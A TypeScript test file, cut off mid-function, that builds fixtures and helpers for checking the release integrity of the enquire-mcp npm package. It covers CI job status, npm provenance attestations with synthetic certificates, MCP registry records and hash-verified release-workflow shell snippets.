import { spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import { existsSync, readdirSync, readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { load } from "js-yaml";
import ts from "typescript";
import { describe, expect, it } from "vitest";
// @ts-expect-error — .mjs release script has no declaration file; tests exercise its pure core.
import {
  assertChannelVersionAdvance,
  assertMcpbAssetVersion,
  assertReleaseTagMatchesVersion,
  candidateRunIds,
  evaluateConvergentCount,
  evaluateMcpbCandidateRun,
  evaluateMcpbReleaseState,
  evaluateMcpRegistryState,
  evaluateNpmProvenanceAttestations,
  evaluateNpmProvenanceContext,
  evaluateNpmPublication,
  evaluateReleaseChecks,
  flattenPaginatedArrays,
  flattenPaginatedField,
  REQUIRED_RELEASE_CHECKS
} from "../scripts/check-release-integrity.mjs";
// @ts-expect-error — .mjs safety helpers have no declaration file; the release invariant exercises their pure contract.
import {
  nativeBinaryReason,
  portableArchiveKey,
  portableArchivePath,
  resolveRequiredDependencyRefs
} from "../scripts/lib/mcpb-safety.mjs";
// @ts-expect-error — .mjs consumer helpers have no declaration file; the release invariant exercises cleanup behavior.
import { createOwnedScratch, removeOwnedScratch } from "../scripts/mcpb-consumer.mjs";
import { ReleaseMutationPlan } from "./release-mutation-plan.js";

interface WorkflowJob {
  id: number;
  name: string;
  status: "completed" | "in_progress";
  conclusion: string | null;
  started_at: string;
  run_id: number;
  run_attempt: number;
  head_sha: string;
  workflow_name: string;
}

function runReleaseIntegrityCli(args: string[], input = "", extraEnv: Record<string, string> = {}) {
  return spawnSync(
    process.execPath,
    [fileURLToPath(new URL("../scripts/check-release-integrity.mjs", import.meta.url)), ...args],
    {
      encoding: "utf8",
      env: { ...process.env, ...extraEnv },
      input
    }
  );
}

const TRUSTED_SOURCE_SHA = "252c54c0e0d4939c9f7b93470a4a2d7c7a0ac78c";
const NPM_PROVENANCE_TAG = "v4.0.0-rc.2";
const NPM_PROVENANCE_VERSION = "4.0.0-rc.2";
const NPM_PROVENANCE_RUN_ID = "30726087813";
const NPM_PROVENANCE_RUN_ATTEMPT = "2";
const NPM_PROVENANCE_PUBLISH_PREDICATE = "https://github.com/npm/attestation/tree/main/specs/publish/v0.1";
const NPM_PROVENANCE_SLSA_PREDICATE = "https://slsa.dev/provenance/v1";
const NPM_PROVENANCE_SHA512_HEX = "ab".repeat(64);
const NPM_PROVENANCE_INTEGRITY = `sha512-${Buffer.from(NPM_PROVENANCE_SHA512_HEX, "hex").toString("base64")}`;
const NPM_PROVENANCE_PUBLISH_KEY_HINT = `SHA256:${Buffer.from("11".repeat(32), "hex").toString("base64").slice(0, -1)}`;
const NPM_PROVENANCE_SIGNER_URI = `https://github.com/oomkapwn/enquire-mcp/.github/workflows/release.yml@refs/tags/${NPM_PROVENANCE_TAG}`;
const NPM_PROVENANCE_OIDC_ISSUER = "https://token.actions.githubusercontent.com";
const NPM_PROVENANCE_SLSA_CERTIFICATE_WITHOUT_ISSUER =
  "MIICHjCCAYegAwIBAgIJAM7GhthLV625MA0GCSqGSIb3DQEBCwUAMBsxGTAXBgNVBAMMEGVucXVpcmUtbWNwLXRlc3QwHhcN" +
  "MjYwODAyMTY1NzEwWhcNMzYwNzMwMTY1NzEwWjAbMRkwFwYDVQQDDBBlbnF1aXJlLW1jcC10ZXN0MIGfMA0GCSqGSIb3DQEB" +
  "AQUAA4GNADCBiQKBgQCsgolKa0y13lWHBmx2SAtw01UvLQMslKIkltUINUnnjHkKFvTxuFQ/yR5/QVehxqld+eYZRK1mvGWR" +
  "X2Jw5pXAZFxiXw4mcVL1XzLONm1SVVOlFbPaU2ZZS+LuhAHiVzqxa9G1OQrBGRODcU0x+PV8HXB4wUIvdgwUZQarh9qr4QID" +
  "AQABo2owaDBmBgNVHREEXzBdhltodHRwczovL2dpdGh1Yi5jb20vb29ta2Fwd24vZW5xdWlyZS1tY3AvLmdpdGh1Yi93b3Jr" +
  "Zmxvd3MvcmVsZWFzZS55bWxAcmVmcy90YWdzL3Y0LjAuMC1yYy4yMA0GCSqGSIb3DQEBCwUAA4GBAJHZcjzKxq76TBa8ctTk" +
  "UdiF0P5Sn2ZczQ3kbmyHS6UI3SPUIWblfq6VKf2uLkwn7dhKm8ArJSF5w7ROo9KsqsF39BjZa2d7zwEtcSgaiilnng5rNPfk" +
  "jxrjCrQ7Qi/3Ic+zNan75bVYilbvE7uNJ7q33QrieZ8Jl7pW3MfASf4o";
const NPM_PROVENANCE_SLSA_CERTIFICATE =
  "MIICWzCCAcSgAwIBAgIJAOoJfZTajzjgMA0GCSqGSIb3DQEBCwUAMBsxGTAXBgNVBAMMEGVucXVpcmUtbWNwLXRlc3QwHhcN" +
  "MjYwODAyMTcwOTIyWhcNMzYwNzMwMTcwOTIyWjAbMRkwFwYDVQQDDBBlbnF1aXJlLW1jcC10ZXN0MIGfMA0GCSqGSIb3DQEB" +
  "AQUAA4GNADCBiQKBgQDHWh5M6QghtpUHNJaXcUwO/OQRWp4aRIFQNkeuCOqGHANP4pS6THSPrX9UraD4KZts4JzGp9MY4XIF" +
  "noIPB2IJuMeokTxFCtoXKN/TE1vuF1neXHSZHOqI2UbnkKD9VFGe9mGq/cAkcomRit65Oxr57/ePnU2zj9QKOSUmg+j64QID" +
  "AQABo4GmMIGjMGYGA1UdEQRfMF2GW2h0dHBzOi8vZ2l0aHViLmNvbS9vb21rYXB3bi9lbnF1aXJlLW1jcC8uZ2l0aHViL3dv" +
  "cmtmbG93cy9yZWxlYXNlLnltbEByZWZzL3RhZ3MvdjQuMC4wLXJjLjIwOQYKKwYBBAGDvzABAQQraHR0cHM6Ly90b2tlbi5h" +
  "Y3Rpb25zLmdpdGh1YnVzZXJjb250ZW50LmNvbTANBgkqhkiG9w0BAQsFAAOBgQCfHNFSPWWSWPGP84oGNAQcyiSZoDGkbjbD" +
  "DmxvijxxJaAy7su8MuY5r1hYIV0y8WCZtSx7N3AloHwIrAi5dcKF4sw9jQXHPTp1NbFezpCwQI3QOqTN7TNh5TMMGj0LcmHt" +
  "vtzYxsnigvmamRlAdq6UwX3GV7bZpGo+8xQPjylS9w==";
const NPM_PROVENANCE_SLSA_UTF8_ISSUER_CERTIFICATE =
  "MIICXTCCAcagAwIBAgIJAIOLZcM2TTc6MA0GCSqGSIb3DQEBCwUAMBsxGTAXBgNVBAMMEGVucXVpcmUtbWNwLXRlc3QwHhcN" +
  "MjYwODAyMTcwOTI5WhcNMzYwNzMwMTcwOTI5WjAbMRkwFwYDVQQDDBBlbnF1aXJlLW1jcC10ZXN0MIGfMA0GCSqGSIb3DQEB" +
  "AQUAA4GNADCBiQKBgQDRwAlvNOQCo39187885umQjdbJVkquRXzV16yGNi/oG0DvKYJ5HqKIJct+NziQl2SaviD7jltC1Aa7" +
  "aoDbtn51GmbPkcyVOpbm0CYyIR4iREsTrp+XLDMfITuuidis8sEDiIkveny41R8yEp47Rh356KiTDP2OwZG4mEWz1SKgfQID" +
  "AQABo4GoMIGlMGYGA1UdEQRfMF2GW2h0dHBzOi8vZ2l0aHViLmNvbS9vb21rYXB3bi9lbnF1aXJlLW1jcC8uZ2l0aHViL3dv" +
  "cmtmbG93cy9yZWxlYXNlLnltbEByZWZzL3RhZ3MvdjQuMC4wLXJjLjIwOwYKKwYBBAGDvzABCAQtDCtodHRwczovL3Rva2Vu" +
  "LmFjdGlvbnMuZ2l0aHVidXNlcmNvbnRlbnQuY29tMA0GCSqGSIb3DQEBCwUAA4GBAFwJEDM2bhJkVFpYbM5KBAGKy3zsnjom" +
  "EdHK18BBVUZeDrEFKboV9piz7IWJonAMsWdSQnD481xtLxazG6JPC9ocDqZBhS60Ft3q6KbGK4xh0t68o1ZJus9WNCv6BIcI" +
  "iDODPllji3mFSbCvLf+ag+r1yL+EFt4+r3TZS2jaG00i";
const NPM_PROVENANCE_SLSA_DUAL_ISSUER_CERTIFICATE =
  "MIICmDCCAgGgAwIBAgIJALn2xJ4HhwaJMA0GCSqGSIb3DQEBCwUAMBsxGTAXBgNVBAMMEGVucXVpcmUtbWNwLXRlc3QwHhcN" +
  "MjYwODAyMTcwOTM3WhcNMzYwNzMwMTcwOTM3WjAbMRkwFwYDVQQDDBBlbnF1aXJlLW1jcC10ZXN0MIGfMA0GCSqGSIb3DQEB" +
  "AQUAA4GNADCBiQKBgQDOv9eiItDz1kWHAm4499OYbGrRgEfJBK4bZ3w0CIi29xnYBsDMwjQrFzRmnuGQ1/GWAcHmF0nXJhQq" +
  "s11WD2jiRpRDEHHc+rFMCapF5S3A0V44S2MRFFcZiIm+hqJI9l9hpV81AAVWqUZ6hGAPgivXi+6MaeG+yt5S/aVKnQu+qwID" +
  "AQABo4HjMIHgMGYGA1UdEQRfMF2GW2h0dHBzOi8vZ2l0aHViLmNvbS9vb21rYXB3bi9lbnF1aXJlLW1jcC8uZ2l0aHViL3dv" +
  "cmtmbG93cy9yZWxlYXNlLnltbEByZWZzL3RhZ3MvdjQuMC4wLXJjLjIwOQYKKwYBBAGDvzABAQQraHR0cHM6Ly90b2tlbi5h" +
  "Y3Rpb25zLmdpdGh1YnVzZXJjb250ZW50LmNvbTA7BgorBgEEAYO/MAEIBC0MK2h0dHBzOi8vdG9rZW4uYWN0aW9ucy5naXRo" +
  "dWJ1c2VyY29udGVudC5jb20wDQYJKoZIhvcNAQELBQADgYEAJgHMhx+n2p3jRZ8R8AryWRDg3O0t1fXjupajuDxFm4iFF1qQ" +
  "S2IqX75vPyZI1bWTfDNoviSp2WEcaa7+uFDNsS9joc0pePSRGtSTX7PhOUrNaSOic/wIoZpKFAFQORbIYuHtI7BijlBOJpuL" +
  "BnDUXBxznOVOe6nCSPcB5r+mBDs=";
const NPM_PROVENANCE_SLSA_MULTIPLE_SAN_CERTIFICATE =
  "MIICezCCAeSgAwIBAgIJAJVveVbxIgu4MA0GCSqGSIb3DQEBCwUAMBsxGTAXBgNVBAMMEGVucXVpcmUtbWNwLXRlc3QwHhcN" +
  "MjYwODAyMTcxMDAxWhcNMzYwNzMwMTcxMDAxWjAbMRkwFwYDVQQDDBBlbnF1aXJlLW1jcC10ZXN0MIGfMA0GCSqGSIb3DQEB" +
  "AQUAA4GNADCBiQKBgQC1bQ3SzrjivVeeJATcGnIp0bolxed+7SEhBh44GY2AbXj/nLfpHEtDe7LXxpsVsSEE3wFbOK2VhLcn" +
  "RXIc0LFxJweYny4HSbxua2/fA6O0Jpaqdv2XvHp2aH2RBYPA2YnPo2PqUnRHkwucccPwoXHoIyIdjtaJJ5ct09Q4+i4LGwID" +
  "AQABo4HGMIHDMIGFBgNVHREEfjB8hltodHRwczovL2dpdGh1Yi5jb20vb29ta2Fwd24vZW5xdWlyZS1tY3AvLmdpdGh1Yi93" +
  "b3JrZmxvd3MvcmVsZWFzZS55bWxAcmVmcy90YWdzL3Y0LjAuMC1yYy4yhh1odHRwczovL2V4YW1wbGUuaW52YWxpZC9leHRy" +
  "YTA5BgorBgEEAYO/MAEBBCtodHRwczovL3Rva2VuLmFjdGlvbnMuZ2l0aHVidXNlcmNvbnRlbnQuY29tMA0GCSqGSIb3DQEB" +
  "CwUAA4GBAGeIrS3YqdYzaVJPqPDvPgl80zC/5F+7VAkUsl8mdnQVaIVvfqbULNzAWIn9lEYZ1KlEQsJt9aVWn7TyFSoLZUsl" +
  "ZHaHy57VsQPv5YXLOvtbLBFUfUJnpj27d4q0g/xR7gqqrtztbmp8+R8SP7dOpGMvVEYjLWPzc3SE1MbptfGb";
const RELEASE_JOB_CLOCK_GUARD = `  local now remaining
  if ! now=$(/bin/date +%s) || ! [[ "$now" =~ ^[1-9][0-9]*$ ]]; then
    echo "::error::Current epoch is unavailable or malformed" >&2
    return 2
  fi
  remaining=$((RELEASE_JOB_DEADLINE_EPOCH - now))`;
const MUTATED_RELEASE_JOB_CLOCK_GUARD = `  local now remaining
  if ! now=$(/bin/date +%s) || ! [[ "$now" =~ ^[1-9][0-9]*$ ]]; then
    echo "::error::Current epoch is unavailable or malformed" >&2
    return 2
  fi
  remaining=$((RELEASE_JOB_DEADLINE_EPOCH - RELEASE_JOB_DEADLINE_EPOCH))`;
const GH_READ_DEADLINE_GUARD = `${RELEASE_JOB_CLOCK_GUARD}\n  if [ "$remaining" -le 10 ]; then`;
const NPM_RESERVE_DEADLINE_GUARD = `${RELEASE_JOB_CLOCK_GUARD}\n  if [ "$remaining" -lt "$required" ]; then`;
const rawClockGuard = (guard: string) => `          ${guard.split("\n").join("\n          ")}`;
const RAW_GH_READ_DEADLINE_GUARD = `${rawClockGuard(RELEASE_JOB_CLOCK_GUARD)}
            if [ "$remaining" -le 10 ]; then`;
const RAW_NPM_RESERVE_DEADLINE_GUARD = `${rawClockGuard(RELEASE_JOB_CLOCK_GUARD)}
            if [ "$remaining" -lt "$required" ]; then`;
const MUTATED_RAW_GH_READ_DEADLINE_GUARD = `${rawClockGuard(MUTATED_RELEASE_JOB_CLOCK_GUARD)}
            if [ "$remaining" -le 10 ]; then`;
const MUTATED_RAW_NPM_RESERVE_DEADLINE_GUARD = `${rawClockGuard(MUTATED_RELEASE_JOB_CLOCK_GUARD)}
            if [ "$remaining" -lt "$required" ]; then`;
const GH_READ_GUARD_COUNT = 6;
const GH_READ_HELPER_COUNT = 7;
const GH_READ_API_CALL_COUNT = 46;
const RELEASE_DEADLINE_ENV_BINDING_COUNT = 7;
const RELEASE_FIXTURE_GH_CONFIG_COUNT = 6;
const RELEASE_FIXTURE_PROXY_UNSET_COUNT = 9;
const RELEASE_HARDENED_ENV_COUNT = 8;
const RELEASE_HARDENED_SHELL_COUNT = 8;
const RELEASE_TLS_PIN_COUNT = 7;
const RELEASE_RESERVE_GUARD_COUNT = 4;
const RELEASE_SECRET_GITHUB_TOKEN_COUNT = 6;
const RELEASE_SINGLETON_DECODER_COUNT = 2;
const MCP_REGISTRY_STEP_NAME = "Publish to MCP Registry (stable only)";
const TRUSTED_CI_RUN = Object.freeze({
  id: 30_726_087_813,
  name: "CI",
  path: ".github/workflows/ci.yml",
  event: "push",
  head_branch: "main",
  head_sha: TRUSTED_SOURCE_SHA,
  run_attempt: 1,
  status: "completed"
});

function job(
  name: string,
  id: number,
  conclusion: string | null = "success",
  status: WorkflowJob["status"] = "completed",
  runAttempt = TRUSTED_CI_RUN.run_attempt
): WorkflowJob {
  return {
    id,
    name,
    status,
    conclusion,
    started_at: new Date(Date.UTC(2026, 6, 25, 0, 0, id)).toISOString(),
    run_id: TRUSTED_CI_RUN.id,
    run_attempt: runAttempt,
    head_sha: TRUSTED_SOURCE_SHA,
    workflow_name: "CI"
  };
}

function allSuccessful(): WorkflowJob[] {
  return REQUIRED_RELEASE_CHECKS.map((name: string, index: number) => job(name, index + 1));
}

function evaluateChecks(jobs: WorkflowJob[], workflowRun = TRUSTED_CI_RUN) {
  return evaluateReleaseChecks(jobs, workflowRun, TRUSTED_SOURCE_SHA);
}

function releaseAsset(name: string, id: number) {
  return {
    id,
    name,
    state: "uploaded",
    content_type: "application/octet-stream",
    size: id,
    digest: `sha256:${id.toString(16).padStart(64, "0")}`
  };
}

function npmProvenanceContext() {
  const exact = {
    eventName: "push",
    sha: TRUSTED_SOURCE_SHA,
    ref: `refs/tags/${NPM_PROVENANCE_TAG}`,
    refName: NPM_PROVENANCE_TAG,
    refType: "tag",
    repository: "oomkapwn/enquire-mcp",
    repositoryId: "1227411427",
    repositoryOwnerId: "274092130",
    serverUrl: "https://github.com",
    workflowRef: `oomkapwn/enquire-mcp/.github/workflows/release.yml@refs/tags/${NPM_PROVENANCE_TAG}`,
    workflowSha: TRUSTED_SOURCE_SHA,
    runId: NPM_PROVENANCE_RUN_ID,
    runAttempt: NPM_PROVENANCE_RUN_ATTEMPT,
    runnerEnvironment: "github-hosted"
  };
  return { declared: { ...exact }, runtime: { ...exact } };
}

function npmProvenanceSubject(
  name = `pkg:npm/%40oomkapwn/enquire-mcp@${NPM_PROVENANCE_VERSION}`,
  sha512 = NPM_PROVENANCE_SHA512_HEX
) {
  return [{ name, digest: { sha512 } }];
}

interface NpmPublishStatementOptions {
  statementType?: string;
  subject?: unknown;
  predicateType?: string;
  name?: string;
  version?: string;
  registry?: string;
}

function npmPublishStatement(options: NpmPublishStatementOptions = {}) {
  return {
    _type: options.statementType ?? "https://in-toto.io/Statement/v0.1",
    subject: options.subject ?? npmProvenanceSubject(),
    predicateType: options.predicateType ?? NPM_PROVENANCE_PUBLISH_PREDICATE,
    predicate: {
      name: options.name ?? "@oomkapwn/enquire-mcp",
      version: options.version ?? NPM_PROVENANCE_VERSION,
      registry: options.registry ?? "https://registry.npmjs.org"
    }
  };
}

interface NpmSlsaStatementOptions {
  statementType?: string;
  subject?: unknown;
  predicateType?: string;
  buildType?: string;
  workflowRef?: string;
  workflowRepository?: string;
  workflowPath?: string;
  eventName?: string;
  repositoryId?: string;
  repositoryOwnerId?: string;
  dependencyUri?: string;
  gitCommit?: string;
  builderId?: string;
  runId?: string;
  runAttempt?: string;
  invocationId?: string;
}

function npmSlsaStatement(options: NpmSlsaStatementOptions = {}) {
  const runId = options.runId ?? NPM_PROVENANCE_RUN_ID;
  const runAttempt = options.runAttempt ?? NPM_PROVENANCE_RUN_ATTEMPT;
  return {
    _type: options.statementType ?? "https://in-toto.io/Statement/v1",
    subject: options.subject ?? npmProvenanceSubject(),
    predicateType: options.predicateType ?? NPM_PROVENANCE_SLSA_PREDICATE,
    predicate: {
      buildDefinition: {
        buildType: options.buildType ?? "https://slsa-framework.github.io/github-actions-buildtypes/workflow/v1",
        externalParameters: {
          workflow: {
            ref: options.workflowRef ?? `refs/tags/${NPM_PROVENANCE_TAG}`,
            repository: options.workflowRepository ?? "https://github.com/oomkapwn/enquire-mcp",
            path: options.workflowPath ?? ".github/workflows/release.yml"
          }
        },
        internalParameters: {
          github: {
            event_name: options.eventName ?? "push",
            repository_id: options.repositoryId ?? "1227411427",
            repository_owner_id: options.repositoryOwnerId ?? "274092130"
          }
        },
        resolvedDependencies: [
          {
            uri: options.dependencyUri ?? `git+https://github.com/oomkapwn/enquire-mcp@refs/tags/${NPM_PROVENANCE_TAG}`,
            digest: { gitCommit: options.gitCommit ?? TRUSTED_SOURCE_SHA }
          }
        ]
      },
      runDetails: {
        builder: { id: options.builderId ?? "https://github.com/actions/runner/github-hosted" },
        metadata: {
          invocationId:
            options.invocationId ??
            `https://github.com/oomkapwn/enquire-mcp/actions/runs/${runId}/attempts/${runAttempt}`
        }
      }
    }
  };
}

interface NpmAttestationBundleOptions {
  mediaType?: unknown;
  verificationMaterial?: unknown;
  payloadType?: unknown;
  payload?: unknown;
  signatures?: unknown;
}

function npmPublishVerificationMaterial() {
  return {
    publicKey: { hint: NPM_PROVENANCE_PUBLISH_KEY_HINT },
    tlogEntries: [{}],
    timestampVerificationData: {}
  };
}

function npmSlsaVerificationMaterial(certificates: unknown[] = [{ rawBytes: NPM_PROVENANCE_SLSA_CERTIFICATE }]) {
  return {
    x509CertificateChain: { certificates },
    tlogEntries: [{}],
    timestampVerificationData: {}
  };
}

function mutateNpmCertificateBytes(certificate: string, exactBytes: Buffer, replacementBytes: Buffer): string {
  const certificateDer = Buffer.from(certificate, "base64");
  const mutationOffset = certificateDer.indexOf(exactBytes);
  if (
    replacementBytes.length !== exactBytes.length ||
    mutationOffset < 0 ||
    certificateDer.indexOf(exactBytes, mutationOffset + 1) >= 0
  ) {
    throw new Error("test certificate mutation must replace one exact equal-length byte sequence");
  }
  replacementBytes.copy(certificateDer, mutationOffset);
  return certificateDer.toString("base64");
}

function npmCertificateWithSignerUri(signerUri: string): string {
  return mutateNpmCertificateBytes(
    NPM_PROVENANCE_SLSA_CERTIFICATE,
    Buffer.from(NPM_PROVENANCE_SIGNER_URI, "utf8"),
    Buffer.from(signerUri, "utf8")
  );
}

function npmAttestationBundle(
  predicateType: string,
  statement: Record<string, unknown>,
  options: NpmAttestationBundleOptions = {}
) {
  const publish = predicateType === NPM_PROVENANCE_PUBLISH_PREDICATE;
  const verificationMaterial = publish ? npmPublishVerificationMaterial() : npmSlsaVerificationMaterial();
  return {
    predicateType,
    bundle: {
      mediaType:
        options.mediaType === undefined ? "application/vnd.dev.sigstore.bundle+json;version=0.2" : options.mediaType,
      verificationMaterial:
        options.verificationMaterial === undefined ? verificationMaterial : options.verificationMaterial,
      dsseEnvelope: {
        payloadType: options.payloadType === undefined ? "application/vnd.in-toto+json" : options.payloadType,
        payload:
          options.payload === undefined
            ? Buffer.from(JSON.stringify(statement), "utf8").toString("base64")
            : options.payload,
        signatures:
          options.signatures === undefined
            ? [{ sig: "dGVzdA==", keyid: publish ? NPM_PROVENANCE_PUBLISH_KEY_HINT : "" }]
            : options.signatures
      }
    }
  };
}

interface NpmProvenanceReportOptions {
  publish?: NpmPublishStatementOptions;
  slsa?: NpmSlsaStatementOptions;
  bundles?: unknown[];
  targetOverrides?: Record<string, unknown>;
  extraVerified?: unknown[];
  invalid?: unknown[];
  missing?: unknown[];
  targetCopies?: number;
}

function npmProvenanceReport(options: NpmProvenanceReportOptions = {}) {
  const bundles = options.bundles ?? [
    npmAttestationBundle(NPM_PROVENANCE_PUBLISH_PREDICATE, npmPublishStatement(options.publish)),
    npmAttestationBundle(NPM_PROVENANCE_SLSA_PREDICATE, npmSlsaStatement(options.slsa))
  ];
  const target = {
    name: "@oomkapwn/enquire-mcp",
    version: NPM_PROVENANCE_VERSION,
    location: "node_modules/@oomkapwn/enquire-mcp",
    registry: "https://registry.npmjs.org/",
    attestations: {
      url: `https://registry.npmjs.org/-/npm/v1/attestations/@oomkapwn%2fenquire-mcp@${NPM_PROVENANCE_VERSION}`,
      provenance: { predicateType: NPM_PROVENANCE_SLSA_PREDICATE }
    },
    attestationBundles: bundles,
    ...options.targetOverrides
  };
  const targetCopies = options.targetCopies ?? 1;
  return {
    invalid: options.invalid ?? [],
    missing: options.missing ?? [],
    verified: [
      ...(options.extraVerified ?? []),
      ...Array.from({ length: targetCopies }, () => ({ ...target, attestationBundles: [...bundles] }))
    ]
  };
}

function npmProvenanceExpected(
  publishAttempted: boolean,
  overrides: Partial<{
    name: string;
    version: string;
    integrity: string;
    sourceSha: string;
    tag: string;
    currentRunId: string;
    currentRunAttempt: string;
  }> = {}
) {
  return {
    name: "@oomkapwn/enquire-mcp",
    version: NPM_PROVENANCE_VERSION,
    integrity: NPM_PROVENANCE_INTEGRITY,
    sourceSha: TRUSTED_SOURCE_SHA,
    tag: NPM_PROVENANCE_TAG,
    publishAttempted,
    currentRunId: NPM_PROVENANCE_RUN_ID,
    currentRunAttempt: NPM_PROVENANCE_RUN_ATTEMPT,
    ...overrides
  };
}

const MCP_REGISTRY_NAME = "io.github.oomkapwn/enquire-mcp";
const MCP_REGISTRY_PACKAGE = "@oomkapwn/enquire-mcp";
const MCP_REGISTRY_VERSION = "4.0.0";
const MCP_REGISTRY_OFFICIAL_META = "io.modelcontextprotocol.registry/official";
const MCP_REGISTRY_BASE_URL = `https://registry.modelcontextprotocol.io/v0.1/servers/${encodeURIComponent(MCP_REGISTRY_NAME)}/versions`;

function mcpRegistryServer(version = MCP_REGISTRY_VERSION, overrides: Record<string, unknown> = {}) {
  return {
    $schema: "https://static.modelcontextprotocol.io/schemas/2025-12-11/server.schema.json",
    name: MCP_REGISTRY_NAME,
    title: "enquire-mcp — local Obsidian memory for AI agents",
    description: "Local Obsidian memory server with cited hybrid search.",
    websiteUrl: "https://github.com/oomkapwn/enquire-mcp",
    repository: {
      url: "https://github.com/oomkapwn/enquire-mcp",
      source: "github"
    },
    version,
    packages: [
      {
        registryType: "npm",
        identifier: MCP_REGISTRY_PACKAGE,
        version,
        transport: { type: "stdio" },
        runtimeArguments: [
          {
            type: "positional",
            valueHint: "subcommand",
            value: "serve",
            description: "Start the stdio MCP server",
            isRequired: true,
            format: "string"
          },
          {
            type: "named",
            name: "--vault",
            description: "Path to the Obsidian vault",
            isRequired: true,
            format: "string"
          }
        ]
      }
    ],
    ...overrides
  };
}

function mcpRegistryRecordBody(
  server: Record<string, unknown> = mcpRegistryServer(),
  officialOverrides: Record<string, unknown> = {}
) {
  return JSON.stringify({
    server,
    _meta: {
      [MCP_REGISTRY_OFFICIAL_META]: {
        isLatest: true,
        publishedAt: "2026-08-02T12:00:00Z",
        status: "active",
        statusChangedAt: "2026-08-02T12:00:00Z",
        updatedAt: "2026-08-02T12:00:01Z",
        ...officialOverrides
      }
    }
  });
}

function mcpRegistryEnvelope(
  target: "exact" | "latest",
  overrides: Partial<{
    requestUrl: string;
    curlExit: number;
    httpStatus: string;
    contentType: string;
    body: string;
  }> = {}
) {
  return {
    requestUrl:
      target === "exact"
        ? `${MCP_REGISTRY_BASE_URL}/${MCP_REGISTRY_VERSION}?include_deleted=true`
        : `${MCP_REGISTRY_BASE_URL}/latest?include_deleted=true`,
    curlExit: 0,
    httpStatus: "200",
    contentType: "application/json",
    body: mcpRegistryRecordBody(),
    ...overrides
  };
}

function mcpRegistryNotFoundEnvelope(target: "exact" | "latest") {
  return mcpRegistryEnvelope(target, {
    httpStatus: "404",
    contentType: "application/problem+json",
    body: JSON.stringify({ detail: "Server not found", status: 404, title: "Not Found" })
  });
}

function mcpRegistryState(
  exact = mcpRegistryEnvelope("exact"),
  latest = mcpRegistryEnvelope("latest"),
  server: Record<string, unknown> = mcpRegistryServer()
) {
  return {
    expected: {
      server,
      package: { name: MCP_REGISTRY_PACKAGE, version: MCP_REGISTRY_VERSION, mcpName: MCP_REGISTRY_NAME }
    },
    exact,
    latest
  };
}

type YamlRecord = Record<string, unknown>;

function yamlRecord(value: unknown): YamlRecord | null {
  return typeof value === "object" && value !== null && !Array.isArray(value) ? (value as YamlRecord) : null;
}

function yamlSteps(job: YamlRecord): YamlRecord[] {
  const value = job.steps;
  if (!Array.isArray(value)) return [];
  return value.map(yamlRecord).filter((step): step is YamlRecord => step !== null);
}

function namedStep(steps: YamlRecord[], name: string): YamlRecord | undefined {
  return steps.find((step) => step.name === name);
}

function runBody(step: YamlRecord | undefined): string {
  return typeof step?.run === "string" ? step.run : "";
}

const RELEASE_TRANSACTION_FIXTURE_KEY = "x-enquire-release-transaction-script-under-test";
const GITHUB_RUN_CHARACTER_LIMIT = 21_000;
const LOWERCASE_PROXY_UNSET = "builtin unset -v https_proxy http_proxy all_proxy";
const NPM_LOWERCASE_PIN_BLOCK =
  'npm_config_registry="$NPM_CONFIG_REGISTRY"\n' +
  'npm_config_proxy="$NPM_CONFIG_PROXY"\n' +
  'npm_config_https_proxy="$NPM_CONFIG_HTTPS_PROXY"\n' +
  'npm_config_cafile="$NPM_CONFIG_CAFILE"\n' +
  'npm_config_ca="$NPM_CONFIG_CA"\n' +
  'npm_config_strict_ssl="$NPM_CONFIG_STRICT_SSL"\n' +
  'npm_config_globalconfig="$NPM_CONFIG_GLOBALCONFIG"\n' +
  'npm_config_fetch_timeout="$NPM_CONFIG_FETCH_TIMEOUT"\n' +
  'npm_config_fetch_retries="$NPM_CONFIG_FETCH_RETRIES"\n' +
  "export npm_config_registry npm_config_proxy npm_config_https_proxy npm_config_cafile npm_config_ca\n" +
  "export npm_config_strict_ssl npm_config_globalconfig npm_config_fetch_timeout npm_config_fetch_retries";

function releaseTransactionWrapper(scriptHash: string): string {
  if (!/^[0-9a-f]{64}$/u.test(scriptHash)) throw new Error("release transaction hash must be lowercase SHA-256");
  return [
    "set -euo pipefail",
    LOWERCASE_PROXY_UNSET,
    'RELEASE_TRANSACTION_PATH=".github/scripts/release-mcpb-github-transaction.sh"',
    `if ! [[ "\${MCPB_RELEASE_WORKFLOW_SHA:-}" =~ ^[0-9a-f]{40}$ ]]; then`,
    '  echo "::error::Workflow commit SHA is missing or malformed"',
    "  exit 1",
    "fi",
    "if ! RELEASE_TRANSACTION_SNAPSHOT=$(",
    "  /usr/bin/env -i \\",
    "    GIT_CONFIG_NOSYSTEM=1 \\",
    "    GIT_CONFIG_SYSTEM=/dev/null \\",
    "    GIT_CONFIG_GLOBAL=/dev/null \\",
    "    GIT_CONFIG_COUNT=0 \\",
    "    GIT_NO_LAZY_FETCH=1 \\",
    "    GIT_NO_REPLACE_OBJECTS=1 \\",
    "    GIT_OPTIONAL_LOCKS=0 \\",
    "    GIT_TERMINAL_PROMPT=0 \\",
    "    /usr/bin/git --no-pager --no-replace-objects \\",
    '    --git-dir="$GITHUB_WORKSPACE/.git" \\',
    '    cat-file blob "$MCPB_RELEASE_WORKFLOW_SHA:$RELEASE_TRANSACTION_PATH"',
    "); then",
    '  echo "::error::GitHub Release transaction script could not be read from the workflow commit"',
    "  exit 1",
    "fi",
    `RELEASE_TRANSACTION_SHA256="${scriptHash}"`,
    "if ! RELEASE_TRANSACTION_ACTUAL_SHA256=$(",
    "  builtin printf '%s' \"$RELEASE_TRANSACTION_SNAPSHOT\" | /usr/bin/sha256sum",
    "); then",
    '  echo "::error::GitHub Release transaction snapshot could not be hashed"',
    "  exit 1",
    "fi",
    `RELEASE_TRANSACTION_ACTUAL_SHA256=\${RELEASE_TRANSACTION_ACTUAL_SHA256%% *}`,
    'if ! [[ "$RELEASE_TRANSACTION_ACTUAL_SHA256" =~ ^[0-9a-f]{64}$ ]] ||',
    '   [ "$RELEASE_TRANSACTION_ACTUAL_SHA256" != "$RELEASE_TRANSACTION_SHA256" ]; then',
    '  echo "::error::GitHub Release transaction script differs from the reviewed workflow identity"',
    "  exit 1",
    "fi",
    "builtin printf '%s\\n' \"$RELEASE_TRANSACTION_SNAPSHOT\" |",
    "  /bin/bash --noprofile --norc -p -e -o pipefail -s --",
    ""
  ].join("\n");
}

function normalizedReleaseTransactionFixture(script: string): string {
  const repositoryCount = mutationMatchCount(script, "$MCPB_RELEASE_REPOSITORY");
  const channelCount = mutationMatchCount(script, "$MCPB_RELEASE_CHANNEL");
  if (
